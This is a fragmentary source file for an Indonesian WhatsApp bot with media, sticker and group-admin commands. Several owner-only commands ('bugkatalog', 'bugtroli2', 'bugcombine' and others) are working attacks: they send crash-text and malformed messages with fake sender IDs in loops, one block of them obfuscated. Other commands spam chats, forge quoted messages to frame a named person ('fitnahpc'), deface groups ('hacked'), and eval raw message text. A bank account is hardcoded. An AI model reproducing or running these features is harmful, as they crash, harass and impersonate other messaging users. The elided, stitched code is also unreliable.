}
}
} catch(e) {
console.log(e)
...
giie.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*
...
giie.sendMessage(from, duda, sticker, {quoted: mek})
break
				case 'getpp':
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await giie.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await giie.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				giie.sendMessage(from, buffer, image, {quoted: mek})
		} else {
		}
			  break
				case 'public':
...
break
				...
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					...
					giie.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
					...
					giie.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					...
					giie.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
				case 'dadu':
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			giie.sendMessage(from, damdu, sticker, {quoted: mek})
			break
				case 'robot':
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await giie.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
giie.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await giie.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					giie.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await giie.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
...
case 'bass':                 
					...
					mediao = await giie.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
...
case 'sider':
if (!isGroup) return reply(mess.only.group)
infom = await giie.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
...
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  giie.sendMessage(from, `${oi1}`, MessageType.text)
	  }
...
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  ...
	  giie.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await giie.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  giie.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await giie.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  giie.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await giie.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  giie.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	case 'halloween':
...
case 'matrix':
				...
				case 'del':
				case 'delete':
					giie.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await giie.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    giie.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
                ...
                await sleep(4000)
                giie.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					anu = await giie.chats.all()
					giie.setMaxListeners(10)
					for (let _ of anu) {
						giie.deleteChat(_.jid)
					}
...
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await giie.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						giie.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
				...
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					...
					hah = fs.readFileSync(median)
						giie.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
			...
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					...
					if ((args[0]) === 'on') {
						...
						giie.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if ((args[0]) === 'off') {
			...
			if (args.length < 1) return reply(`Cara mengaktifkan ${prefix}autosticker 1, Cara menonaktifkan ${prefix}autosticker 0`)
					if (Number(args[0]) === 1) {
						...
						giie.sendMessage(from,`Perhatian kepada seluruh member fitur autosticker group aktif apabila ada member mengirim gambar dan menggunakan caption apapun, bot akan autosticker gambar kamu.`, text)
			...
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}nsfw on`)
					if ((args[0]) === 'on') {
						if (isNsfw) return reply('Sudah Aktif Kak')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses mengaktifkan fitur nsfw')
						giie.sendMessage(from, `Bebas Nyari Hentai :v`, text)
					} else if ((args[0]) === 'off') {
...
break
case 'rekening':
nama = "𝗥𝗘𝗞𝗘𝗡𝗜𝗡𝗚 𝗕𝗔𝗡𝗞 𝗕𝗥𝗜";
impostor = "𝗔𝗬𝗢𝗚𝗜 & 𝗘𝗞𝗔";
giie.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
reply('➪ *ɴᴏ ʀᴇᴋ:* 808901004442531\n➪ *ɴᴀᴍᴀ:* ᴀʏᴏɢɪ ᴀᴋʙᴀʀ ᴀғʀᴇɴɢɢᴏ\n➪ *ʙᴀɴᴋ:* ʙʀɪ')
break
case 'sharelock':
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
...
break
case 'tts':
					if (args.length < 1) return giie.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return giie.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
					...
					bby.length > 300
						...
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								...
								giie.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
		    ...
		    giie.groupDemoteAdmin(from, [demote])
		    ...
		    giie.groupMakeAdmin(from, [promote])
				...
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await giie.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					giie.sendMessage(from, yeh, text, { quoted: mek })
					break
					case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'revoke':
         ...
         giie.query({json, expect200: true})
          reply('Sukses Mereset Link Group')
             break
                   ...
                   reply(`Sukses membuka grup ${groupName}`)
						giie.groupSettingChange(from, GroupSettingChange.messageSend, false)
						break
						case 'closegc':
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
						...
						giie.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break
				case 'spam':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				...
				for (let i = 0; i < argzi[1]; i++){
					giie.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
                ...
                giie.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
                ...
                giie.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					giie.groupUpdateSubject(from, `${body.slice(11)}`)
				...
				case 'setdescgc':
					...
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					giie.groupUpdateDescription(from, `${body.slice(10)}`)
				...
				if (!isQuotedImage) return reply('Reply imagenya!')
					...
					mediau = await giie.downloadAndSaveMediaMessage(enmediau)
					await giie.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				...
				case 'bc':
					...
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						...
						buff = await giie.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							giie.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						...
						buff = await giie.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							giie.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await giie.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							giie.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
...
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				...
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					giie.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				case 'upswteks':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    giie.sendMessage('status@broadcast', teks, MessageType.text)
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    giie.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NamaBot}`}, MessageType.location)
...
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						...
						buff = await giie.downloadMediaMessage(encmedia)
						giie.sendMessage('status@broadcast', buff, sticker)
						}
...
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						...
						buff = await giie.downloadMediaMessage(encmedia)
						giie.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
...
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await giie.downloadMediaMessage(encmedia)
						giie.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					var mediap = await giie.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    giie.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					media = await giie.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    giie.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    ...
                    giie.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				return giie.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'tomp4':
            ...
            owgi = await giie.downloadAndSaveMediaMessage(ger)
            ...
            case 'tomp3':
					...
					mediad = await giie.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						giie.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
				case 'suit':
...
break
            ...
            break
				...
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await giie.groupMetadata(anu)
				giie.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
					case 'getbio':
	  var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await giie.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
...
const sname = giie.contacts[ambl] != undefined ? giie.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : giie.contacts[ambl].notify || giie.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
            ...
            pictt = await giie.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            giie.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
            ...
            var org = pc.split("|")[1];
            giie.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
				case 'attp':
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					giie.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
				case 'semoji':
    	   ...
    	   break
            ...
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					giie.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					giie.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
				case 'join':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
break
            ...
            file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await giie.groupMetadata(from)
            ...
            giie.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            giie.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            giie.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            giie.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            giie.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
        ...
        break
				case 'status':
case 'stats':
				var groups = giie.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = giie.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					...
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = giie.user.phone
					stamtus = `𝗦𝗧𝗔𝗧𝗨𝗦 𝗕𝗢𝗧𝗦 :
...
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${giie.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${giie.user.phone.wa_version}
Os Version: ${giie.user.phone.os_version}
...
break
				...
				giie.updatePresence(from, Presence.composing)
					...
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						...
						buff = await giie.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							giie.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await giie.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							giie.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
...
var nn = body.slice(9)
           ...
           case 'fitnahpc':
				...
				var bot = gh.split("|")[2];
			    giie.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
            case 'hidetag':
			if (!isGroup) return reply(mess.only.group)
            ...
            if (!isGroup) return reply(mess.only.group)
				...
				giie.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   giie.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                giie.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                giie.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                giie.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
					case 'bugpc2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
giie.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
 quoted: {
key: {
...
giie.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
...
case 'bugkatalog':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
giie.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = giie.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
...
function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./gio.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);giie[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
         break
            ...
            "externalAdReply": {
                ...
                "thumbnail": fs.readFileSync(`./gio.jpg`),
                "sourceUrl": "https://instagram.com/giiexsala"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        giie.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'GIONOVA🌹'},type:1}])
        giie.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
giie.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
giie.toggleDisappearingMessages(from, 0)
break
//Done
case 'bugtroli2':
...
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${NamaBot}`
		        var grousp = await giie.groupMetadata(from)
		        ...
		        for (let i = 0; i < args[0]; i++) {
		        giie.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
		          ...
		          for(let i=0;i<10;i++){
		        giie.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
...
case 'bugcombine':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 giie.toggleDisappearingMessages(from, 'HACKED')
giie.sendMessage(from, `${NamaBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
giie.updatePresence(from, Presence.composing)
		       giie.sendMessage(from, {degreesLatitude: 34.0184,
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
giie.updatePresence(from, Presence.composing)
giie.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
...
└ ❏ *Link:* ${items[i].url}\n\n`
                ...
                await giie.sendMessage(from, thumb, image, {quoted: mek, caption: `${hehe}───────────────\n\n┌ ◪ *DOWNLOAD*
...
└ ${prefix}ytmp4 [link yt] = Video`})
            ...
            break
				...
				case 'sticker':
					...
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await giie.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									...
									.on('end', function () {
										...
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											...
											giie.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
					...
					giie.sendMessage(from, buffer, image, {caption: 'Nih dah jadi kak', quoted: mek})
					break
					case 'take':
			...
			case 'ping':
				...
				if (!isOwner) return reply(mess.only.ownerB)
					return giie.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return giie.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, { quoted: mek })
                 break
                 case 'toimg':
				case 'tomedia':
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await giie.downloadAndSaveMediaMessage(encmedia)
				...
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					giie.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
				...
				case 'liststicker':
					...
					giie.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					giie.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
				...
				case 'listvn':
					...
					giie.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					giie.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
				...
				case 'listimage':
					...
					giie.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await giie.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				...
				giie.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'runtime':
				runtime = process.uptime()
		...
		if (isMedia && isAuto && !mek.message.videoMessage || isQuotedImage) {
						...
						await ffmpeg(`./${media}`)
							...
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								giie.sendMessage(from, buffer, sticker, { quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
...
Giliran = @${tty.player1.split('@')[0]}`
  giie.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
...
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
